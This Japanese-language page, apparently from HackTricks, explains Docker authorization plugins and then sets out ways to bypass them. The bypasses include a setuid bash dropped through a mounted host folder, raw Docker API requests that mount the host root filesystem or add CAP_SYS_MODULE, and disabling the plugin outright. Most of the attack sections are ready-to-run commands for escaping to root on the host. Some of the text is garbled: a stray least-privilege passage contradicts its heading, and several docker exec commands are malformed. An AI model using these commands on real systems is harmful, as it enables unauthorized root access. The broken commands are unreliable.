<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>


**Dockerの**デフォルトの**認可**モデルは**オールオアナッシング**です。Dockerデーモンへのアクセス権を持つユーザーは、**任意の**Dockerクライアント**コマンドを実行**できます。同様に、DockerのエンジンAPIを使用してデーモンに連絡する場合も同様です。より**細かいアクセス制御**が必要な場合、認可プラグインを作成し、Dockerデーモンの設定に追加することができます。認可プラグインを使用すると、Docker管理者はDockerデーモンへのアクセスを管理するための**詳細なアクセスポリシーを設定**できます。

# 基本的なアーキテクチャ

Docker Authプラグインは、Dockerデーモンに対して要求された**アクション**と**要求したユーザー**に応じて、Dockerデーモンへの要求を**許可/拒否**するために使用できる**外部プラグイン**です。

CLIまたはEngine APIを介してDockerデーモンに対して**HTTPリクエスト**が行われると、**認証サブシステム**はリクエストをインストールされた**認証プラグイン**に渡します。リクエストにはユーザー（呼び出し元）とコマンドのコンテキストが含まれています。プラグインはリクエストを**許可**するか**拒否**するかを決定する責任があります。

以下のシーケンス図は、許可と拒否の認可フローを示しています：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

プラグインに送信される各リクエストには、**認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディ**が含まれます。プラグインに渡されるのはユーザー名と使用された認証方法のみです。重要なことは、ユーザーの**資格情報やトークンは渡されない**ことです。最後に、**すべてのリクエスト/レスポンスボディが認可プラグインに送信されるわけではありません**。`Content-Type`が`text/*`または`application/json`であるリクエスト/レスポンスボディのみが送信されます。

`exec`などのHTTP接続を乗っ取る可能性のあるコマンド（`HTTP Upgrade`）に対しては、認可プラグインは最初のHTTPリクエストのみに対して呼び出されます。プラグインがコマンドを承認すると、認可はフローの残りの部分には適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`などのチャンク化されたHTTPレスポンスを返すコマンドに対しては、HTTPリクエストのみが認可プラグインに送信されます。

リクエスト/レスポンスの処理中に、一部の認可フローではDockerデーモンへの追加のクエリが必要になる場合があります。このようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加のクエリを有効にするには、プラグインは管理者が適切な認証とセキュリティポリシーを設定できる手段を提供する必要があります。

## 複数のプラグイン

プラグインをDockerデーモンの**起動時**の一部として**登録**する責任があります。**複数のプラグインをインストールし、それらを連鎖させる**ことができます。このチェーンは順序付けられることができます。デーモンへの各リクエストは、チェーンを順番に通過します。すべてのプラグインがリソースへのアクセスを許可する場合にのみ、アクセスが許可されます。

# プラグインの例

## Twistlock AuthZ Broker

プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**JSON**ファイルを作成して、リクエストの認可に使用するプラグインが**読み取る**ことができます。したがって、各ユーザーがどのAPIエンドポイントにアクセスできるかを非常に簡単に制御できます。

以下は、AliceとBobが新しいコンテナを作成できるようにする例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

ページ[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go)では、要求されたURLとアクションの関係を見つけることができます。ページ[types.go](https://github.com/twistlock/authz/blob/master/core/types.go)では、アクション名とアクションの関係を見つけることができます。

## シンプルなプラグインチュートリアル

[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)には、**理解しやすいプラグイン**と、インストールとデバッグに関する詳細な情報があります。

動作方法を理解するには、`README`と`plugin.go`のコードを読んでください。

# Docker Authプラグインのバイパス

## アクセスの列挙

チェックする主なポイントは、**どのエンドポイントが許可されているか**と、**どのHostConfigの値が許可されているか**です。

この列挙を実行するには、[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)というツールを使用できます。
## `run --privileged`の禁止

### 最小特権

Dockerでは、`run --privileged`コマンドを使用して特権モードでコンテナを実行することができます。しかし、この特権モードはセキュリティ上のリスクを伴います。特権モードでは、コンテナ内のプロセスがホストシステムのリソースにアクセスできるため、悪意のあるプロセスによる攻撃のリスクが高まります。

したがって、セキュリティを強化するためには、最小特権の原則に従って`run --privileged`コマンドの使用を制限する必要があります。最小特権の原則では、コンテナには必要最低限の特権のみを与えることが推奨されます。

特権モードを必要とする場合は、代わりに`--cap-add`および`--cap-drop`オプションを使用して、必要な特権を明示的に指定することができます。これにより、不必要な特権を持つコンテナのリスクを軽減することができます。

以下の例では、`run --privileged`コマンドを使用せずに、必要な特権を指定する方法を示しています。

```bash
docker run --cap-add=SYS_ADMIN --cap-drop=NET_ADMIN ubuntu
```

このようにすることで、コンテナにはSYS_ADMIN特権が与えられますが、NET_ADMIN特権は削除されます。必要な特権のみを指定することで、セキュリティを向上させることができます。
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### コンテナを実行して特権セッションを取得する

この場合、システム管理者はユーザーがボリュームをマウントしたり、`--privileged`フラグを使用してコンテナに追加の機能を与えることを禁止しました。
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
ただし、ユーザーは実行中のコンテナ内でシェルを作成し、追加の特権を与えることができます。
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
今、ユーザーは[**以前に議論されたテクニック**](./#privileged-flag)のいずれかを使用してコンテナから脱出し、ホスト内で特権を昇格させることができます。

## 書き込み可能なフォルダのマウント

この場合、システム管理者はユーザーに`--privileged`フラグでコンテナを実行することを許可せず、コンテナに追加の機能を与えることも許可しません。ただし、`/tmp`フォルダのマウントのみを許可しています。
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
注意してくださいが、おそらく`/tmp`フォルダをマウントすることはできませんが、**別の書き込み可能なフォルダ**をマウントすることはできます。書き込み可能なディレクトリを見つけるには、次のコマンドを使用します：`find / -writable -type d 2>/dev/null`

**すべてのディレクトリがsuidビットをサポートしているわけではありません！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"`を実行します。たとえば、通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs`はsuidビットをサポートしていません。

また、**`/etc`や設定ファイルを含む他のフォルダ**をマウントできる場合は、dockerコンテナ内でrootとしてそれらを変更して、特権をエスカレートさせるためにホストで悪用することができます（たとえば、`/etc/shadow`を変更することができます）
{% endhint %}

## チェックされていないAPIエンドポイント

このプラグインを設定するシステム管理者の責任は、各ユーザーがどのアクションをどの特権で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して**ブラックリスト**アプローチを取る場合、攻撃者が特権をエスカレートさせることができる可能性があるいくつかのエンドポイントを**見落とす**可能性があります。

Docker APIは[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)で確認できます。

## チェックされていないJSON構造

### ルートのバインド

システム管理者がDockerファイアウォールを設定する際に、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)の重要なパラメータである「**Binds**」を忘れてしまう可能性があります。以下の例では、この設定ミスを悪用して、ホストのルート（/）フォルダをマウントするコンテナを作成して実行することができます：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
この例では、JSONのルートレベルのキーとして**`Binds`**パラメータを使用していますが、APIでは**`HostConfig`**キーの下に表示されます。
{% endhint %}

### HostConfig内のBinds

**ルート内のBinds**と同じ手順に従い、Docker APIにこの**リクエスト**を実行してください：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### ルートディレクトリのマウント

**ルートディレクトリのバインド**と同じ手順に従い、Docker APIにこの**リクエスト**を実行してください：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig内のマウント

**ルートのバインド**と同じ手順に従い、Docker APIにこの**リクエスト**を実行してください：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## チェックされていないJSON属性

システム管理者がDockerファイアウォールを設定する際に、[API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)のパラメータの重要な属性である「**Capabilities**」を「**HostConfig**」内に忘れてしまった可能性があります。次の例では、この設定ミスを悪用して、**SYS\_MODULE**の機能を持つコンテナを作成して実行することが可能です。
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`**は通常、コンテナから脱出するための興味深い特権を含んでいるキーです。ただし、前述のように、それ以外の場所でBindsを使用することも機能し、制限を回避することができる可能性があることに注意してください。
{% endhint %}

## プラグインの無効化

もし**システム管理者**が**プラグイン**の**無効化**を**禁止**することを**忘れて**いた場合、これを利用して完全に無効化することができます！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
**特権昇格後にプラグインを再有効化することを忘れないでください**。そうしないと、**Dockerサービスの再起動は機能しません**！

## Auth Plugin Bypassの解説

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# 参考文献

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
